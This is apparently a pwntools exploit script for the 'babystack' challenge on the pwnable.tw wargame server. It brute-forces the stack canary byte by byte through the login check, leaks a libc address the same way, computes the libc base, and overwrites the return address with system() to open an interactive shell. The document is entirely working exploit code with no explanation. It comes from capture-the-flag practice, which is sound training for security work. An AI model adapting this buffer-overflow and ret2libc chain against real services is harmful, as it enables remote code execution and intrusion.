from pwn import *
import time
elf = ELF("./babystack")
libc = ELF("./libc_64")
ld = ELF("./ld-2.23.so")
context.binary=elf
target=remote('chall.pwnable.tw',10205)
context.log_level='DEBUG'

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

def login(password,check=1):
	sa(">> ",str(1))
	if(check==1):
		sa("passowrd :",password)
		if("Success" in target.recvline()):
			return 1
	return 0

def attack(data="A"*0x3f):
	sa(">> ",str(3))
	sa("Copy :",data)

canary=""
for i in range(0x10):
	for j in range(1,0x100):
		if(login(canary+p8(j)+"\x00")==1):
			canary+=p8(j)
			print(canary)
			login("A",0)
			break

payload=(canary+"\x00").ljust(0x40,"A")
payload+=canary
login(payload)
attack()
login("A",0)
libc_leak="\x31"
for i in range(0x4):
	for j in range(1,0x100):
		if(login(canary+libc_leak+p8(j)+"\x00")==1):
			libc_leak+=p8(j)
			login("A",0)
			break
libc_leak+="\x7f"
libc_base=u64(libc_leak.ljust(8,"\x00"))-0x3c4631
print(hex(libc_base))
libc_system=libc_base+libc.symbols["system"]
payload=(canary+"\x00").ljust(0x40,"A")
payload+=canary.ljust(0x28,"A")
payload+=p64(libc_system)
login(payload)
attack()
sa(">> ","2; sh\x00")
target.interactive()
